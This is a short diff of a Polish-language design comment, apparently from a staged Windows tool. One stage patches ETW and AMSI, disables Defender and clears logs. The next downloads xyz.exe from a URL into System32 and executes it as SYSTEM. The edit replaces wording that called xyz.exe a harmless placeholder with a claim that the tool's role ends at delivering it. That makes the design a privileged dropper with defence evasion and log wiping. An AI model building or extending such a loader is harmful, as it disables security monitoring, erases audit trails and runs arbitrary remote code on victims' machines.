@@ -16,7 +16,7 @@
  * INWOKACJA 3 — SYSTEM (/system):
  *   Stage 3: ETW/AMSI patch + Defender disable + log clear
  *   Stage 4: Pobranie xyz.exe z URL + drop do System32 + exec
- *            xyz.exe to placeholder (czarne tło + "test passed")
+ *            xyz.exe to osobna apka testowa. Nasza rola konczy sie na dostarczeniu go jako SYSTEM. xyz.exe sam sprawdza uprawnienia
  * ═══════════════════════════════════════════════════════════════════
  *
  * Design decisions:
